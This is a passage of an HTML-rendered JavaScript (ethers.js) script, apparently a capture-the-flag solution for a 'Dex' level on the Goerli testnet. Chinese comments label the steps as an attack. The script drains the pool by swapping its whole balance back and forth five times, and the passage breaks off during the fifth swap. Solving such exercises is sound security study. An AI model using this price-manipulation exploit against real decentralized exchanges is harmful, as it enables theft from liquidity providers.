class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;ethers&#125; = <span class="built_in">require</span>(<span class="string">&quot;ethers&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> provider = ethers.<span class="title function_">getDefaultProvider</span>(<span class="string">&quot;https://eth-goerli.g.alchemy.com/v2/????????????????&quot;</span>);</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">y</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">DexAddress</span> = <span class="string">&#x27;0x22043141CD8E47CE953F4e1BdC15eD7af8a90e9E&#x27;</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">DexAbi</span> = <span class="string">&#x27;[&#123;&quot;inputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;constructor&quot;&#125;,&#123;&quot;anonymous&quot;:false,&quot;inputs&quot;:[&#123;&quot;indexed&quot;:true,&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;previousOwner&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;indexed&quot;:true,&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;newOwner&quot;,&quot;type&quot;:&quot;address&quot;&#125;],&quot;name&quot;:&quot;OwnershipTransferred&quot;,&quot;type&quot;:&quot;event&quot;&#125;,&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;token_address&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;amount&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;name&quot;:&quot;addLiquidity&quot;,&quot;outputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;spender&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;amount&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;name&quot;:&quot;approve&quot;,&quot;outputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;token&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;account&quot;,&quot;type&quot;:&quot;address&quot;&#125;],&quot;name&quot;:&quot;balanceOf&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;from&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;to&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;amount&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;name&quot;:&quot;getSwapPrice&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[],&quot;name&quot;:&quot;owner&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;address&quot;&#125;],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[],&quot;name&quot;:&quot;renounceOwnership&quot;,&quot;outputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;_token1&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;_token2&quot;,&quot;type&quot;:&quot;address&quot;&#125;],&quot;name&quot;:&quot;setTokens&quot;,&quot;outputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;from&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;to&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;amount&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;name&quot;:&quot;swap&quot;,&quot;outputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[],&quot;name&quot;:&quot;token1&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;address&quot;&#125;],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[],&quot;name&quot;:&quot;token2&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;address&quot;&#125;],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;newOwner&quot;,&quot;type&quot;:&quot;address&quot;&#125;],&quot;name&quot;:&quot;transferOwnership&quot;,&quot;outputs&quot;:[],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;]&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//连接用户</span></span><br><span class="line">    <span class="comment">//利用私钥和provider创建wallet对象</span></span><br><span class="line">    <span class="keyword">const</span> privateKey = <span class="string">&#x27;????????????????????????????????&#x27;</span></span><br><span class="line">    <span class="keyword">const</span> wallet = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(privateKey, provider)</span><br><span class="line">    <span class="comment">// 声明可写合约</span></span><br><span class="line">    <span class="keyword">const</span> <span class="title class_">DexContract</span> = <span class="keyword">new</span> ethers.<span class="title class_">Contract</span>(<span class="title class_">DexAddress</span>, <span class="title class_">DexAbi</span>, wallet)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//查看初始状态</span></span><br><span class="line">    <span class="keyword">const</span> token1Address = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">token1</span>()</span><br><span class="line">    <span class="keyword">const</span> token2Address = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">token2</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`token1的地址<span class="subst">$&#123;token1Address&#125;</span>`</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`token2的地址<span class="subst">$&#123;token2Address&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> balance1 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token1Address,<span class="title class_">DexAddress</span>)</span><br><span class="line">    <span class="keyword">const</span> balance2 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token2Address,<span class="title class_">DexAddress</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之前,Dex中的token1余额为:<span class="subst">$&#123;balance1.toString()&#125;</span>`</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之前,Dex中的token2余额为:<span class="subst">$&#123;balance2.toString()&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> myAddress = <span class="keyword">await</span> wallet.<span class="property">address</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> balance3 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token1Address,myAddress)</span><br><span class="line">    <span class="keyword">const</span> balance4 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token2Address,myAddress)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之前,Dex中我的token1余额为:<span class="subst">$&#123;balance3.toString()&#125;</span>`</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之前,Dex中我的token2余额为:<span class="subst">$&#123;balance4.toString()&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//进行攻击</span></span><br><span class="line">    <span class="comment">//1.授权给Dex，这样我们Dex才可以进行交换</span></span><br><span class="line">        <span class="comment">//1.1准备工作</span></span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">IERC20Abi</span> = <span class="string">&#x27;[&#123;&quot;anonymous&quot;:false,&quot;inputs&quot;:[&#123;&quot;indexed&quot;:true,&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;owner&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;indexed&quot;:true,&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;spender&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;indexed&quot;:false,&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;value&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;name&quot;:&quot;Approval&quot;,&quot;type&quot;:&quot;event&quot;&#125;,&#123;&quot;anonymous&quot;:false,&quot;inputs&quot;:[&#123;&quot;indexed&quot;:true,&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;from&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;indexed&quot;:true,&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;to&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;indexed&quot;:false,&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;value&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;name&quot;:&quot;Transfer&quot;,&quot;type&quot;:&quot;event&quot;&#125;,&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;owner&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;spender&quot;,&quot;type&quot;:&quot;address&quot;&#125;],&quot;name&quot;:&quot;allowance&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;spender&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;amount&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;name&quot;:&quot;approve&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;bool&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;bool&quot;&#125;],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;account&quot;,&quot;type&quot;:&quot;address&quot;&#125;],&quot;name&quot;:&quot;balanceOf&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[],&quot;name&quot;:&quot;totalSupply&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;stateMutability&quot;:&quot;view&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;to&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;amount&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;name&quot;:&quot;transfer&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;bool&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;bool&quot;&#125;],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;,&#123;&quot;inputs&quot;:[&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;from&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;internalType&quot;:&quot;address&quot;,&quot;name&quot;:&quot;to&quot;,&quot;type&quot;:&quot;address&quot;&#125;,&#123;&quot;internalType&quot;:&quot;uint256&quot;,&quot;name&quot;:&quot;amount&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;name&quot;:&quot;transferFrom&quot;,&quot;outputs&quot;:[&#123;&quot;internalType&quot;:&quot;bool&quot;,&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;bool&quot;&#125;],&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;]&#x27;</span></span><br><span class="line">        <span class="comment">//1.2声明token1合约并且授权</span></span><br><span class="line">        <span class="keyword">const</span> token1Contract = <span class="keyword">new</span> ethers.<span class="title class_">Contract</span>(token1Address, <span class="title class_">IERC20Abi</span>, wallet)</span><br><span class="line">        <span class="keyword">var</span> approve1 = <span class="keyword">await</span> token1Contract.<span class="title function_">approve</span>(<span class="title class_">DexAddress</span>,<span class="number">99999</span>)</span><br><span class="line">        <span class="keyword">await</span> approve1.<span class="title function_">wait</span>()</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;给Dex授权token1完成&#x27;</span>)</span><br><span class="line">        <span class="comment">//1.3声明token2合约并且授权</span></span><br><span class="line">        <span class="keyword">const</span> token2Contract = <span class="keyword">new</span> ethers.<span class="title class_">Contract</span>(token2Address, <span class="title class_">IERC20Abi</span>, wallet)</span><br><span class="line">        <span class="keyword">var</span> approve2 = <span class="keyword">await</span> token2Contract.<span class="title function_">approve</span>(<span class="title class_">DexAddress</span>,<span class="number">99999</span>)</span><br><span class="line">        <span class="keyword">await</span> approve2.<span class="title function_">wait</span>()</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;给Dex授权token2完成&#x27;</span>)</span><br><span class="line">    <span class="comment">//2.进行五次swap</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;开始进行swap&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> balanceIn1 = <span class="keyword">await</span> token1Contract.<span class="title function_">balanceOf</span>(myAddress)</span><br><span class="line">    <span class="keyword">var</span> tx1 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">swap</span>(token1Address,token2Address,<span class="built_in">parseInt</span>(balanceIn1.<span class="title function_">toString</span>()))</span><br><span class="line">    <span class="keyword">await</span> tx1.<span class="title function_">wait</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;========【第1次swap完成】=======&#x27;</span>)</span><br><span class="line">        <span class="keyword">const</span> swap_token1_1 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token1Address,<span class="title class_">DexAddress</span>)</span><br><span class="line">        <span class="keyword">const</span> swap_token2_1 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token2Address,<span class="title class_">DexAddress</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中的token1余额为:<span class="subst">$&#123;swap_token1_1.toString()&#125;</span>`</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中的token2余额为:<span class="subst">$&#123;swap_token2_1.toString()&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> swap_token3_1 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token1Address,myAddress)</span><br><span class="line">        <span class="keyword">const</span> swap_token4_1 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token2Address,myAddress)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中我的token1余额为:<span class="subst">$&#123;swap_token3_1.toString()&#125;</span>`</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中我的token2余额为:<span class="subst">$&#123;swap_token4_1.toString()&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> balanceIn2 = <span class="keyword">await</span> token2Contract.<span class="title function_">balanceOf</span>(myAddress)</span><br><span class="line">    <span class="keyword">var</span> tx2 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">swap</span>(token2Address,token1Address,<span class="built_in">parseInt</span>(balanceIn2.<span class="title function_">toString</span>()))</span><br><span class="line">    <span class="keyword">await</span> tx2.<span class="title function_">wait</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;========【第2次swap完成】=======&#x27;</span>)</span><br><span class="line">        <span class="keyword">const</span> swap_token1_2 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token1Address,<span class="title class_">DexAddress</span>)</span><br><span class="line">        <span class="keyword">const</span> swap_token2_2 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token2Address,<span class="title class_">DexAddress</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中的token1余额为:<span class="subst">$&#123;swap_token1_2.toString()&#125;</span>`</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中的token2余额为:<span class="subst">$&#123;swap_token2_2.toString()&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> swap_token3_2 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token1Address,myAddress)</span><br><span class="line">        <span class="keyword">const</span> swap_token4_2 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token2Address,myAddress)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中我的token1余额为:<span class="subst">$&#123;swap_token3_2.toString()&#125;</span>`</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中我的token2余额为:<span class="subst">$&#123;swap_token4_2.toString()&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> balanceIn3 = <span class="keyword">await</span> token1Contract.<span class="title function_">balanceOf</span>(myAddress)</span><br><span class="line">    <span class="keyword">var</span> tx3 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">swap</span>(token1Address,token2Address,<span class="built_in">parseInt</span>(balanceIn3.<span class="title function_">toString</span>()))</span><br><span class="line">    <span class="keyword">await</span> tx3.<span class="title function_">wait</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;========【第3次swap完成】=======&#x27;</span>)</span><br><span class="line">        <span class="keyword">const</span> swap_token1_3 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token1Address,<span class="title class_">DexAddress</span>)</span><br><span class="line">        <span class="keyword">const</span> swap_token2_3 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token2Address,<span class="title class_">DexAddress</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中的token1余额为:<span class="subst">$&#123;swap_token1_3.toString()&#125;</span>`</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中的token2余额为:<span class="subst">$&#123;swap_token2_3.toString()&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> swap_token3_3 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token1Address,myAddress)</span><br><span class="line">        <span class="keyword">const</span> swap_token4_3 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token2Address,myAddress)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中我的token1余额为:<span class="subst">$&#123;swap_token3_3.toString()&#125;</span>`</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中我的token2余额为:<span class="subst">$&#123;swap_token4_3.toString()&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> balanceIn4 = <span class="keyword">await</span> token2Contract.<span class="title function_">balanceOf</span>(myAddress)</span><br><span class="line">    <span class="keyword">var</span> tx4 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">swap</span>(token2Address,token1Address,<span class="built_in">parseInt</span>(balanceIn4.<span class="title function_">toString</span>()),&#123; <span class="attr">gasLimit</span>: <span class="number">21000000</span>, <span class="attr">gasPrice</span>: <span class="number">50000000000</span> &#125;)</span><br><span class="line">    <span class="keyword">await</span> tx4.<span class="title function_">wait</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;========【第4次swap完成】=======&#x27;</span>)</span><br><span class="line">        <span class="keyword">const</span> swap_token1_4 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token1Address,<span class="title class_">DexAddress</span>)</span><br><span class="line">        <span class="keyword">const</span> swap_token2_4 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token2Address,<span class="title class_">DexAddress</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中的token1余额为:<span class="subst">$&#123;swap_token1_4.toString()&#125;</span>`</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中的token2余额为:<span class="subst">$&#123;swap_token2_4.toString()&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> swap_token3_4 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token1Address,myAddress)</span><br><span class="line">        <span class="keyword">const</span> swap_token4_4 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token2Address,myAddress)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中我的token1余额为:<span class="subst">$&#123;swap_token3_4.toString()&#125;</span>`</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中我的token2余额为:<span class="subst">$&#123;swap_token4_4.toString()&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> balanceIn5 = <span class="keyword">await</span> token1Contract.<span class="title function_">balanceOf</span>(myAddress)</span><br><span class="line">    <span class="keyword">var</span> tx5 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">swap</span>(token1Address,token2Address,<span class="built_in">parseInt</span>(balanceIn5.<span class="title function_">toString</span>()),&#123; <span class="attr">gasLimit</span>: <span class="number">21000000</span>, <span class="attr">gasPrice</span>: <span class="number">50000000000</span> &#125;)</span><br><span class="line">    <span class="keyword">await</span> tx5.<span class="title function_">wait</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;========【第5次swap完成】=======&#x27;</span>)</span><br><span class="line">        <span class="keyword">const</span> swap_token1_5 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token1Address,<span class="title class_">DexAddress</span>)</span><br><span class="line">        <span class="keyword">const</span> swap_token2_5 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span class="title function_">balanceOf</span>(token2Address,<span class="title class_">DexAddress</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中的token1余额为:<span class="subst">$&#123;swap_token1_5.toString()&#125;</span>`</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`攻击之后,Dex中的token2余额为:<span class="subst">$&#123;swap_token2_5.toString()&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> swap_token3_5 = <span class="keyword">await</span> <span class="title class_">DexContract</span>.<span 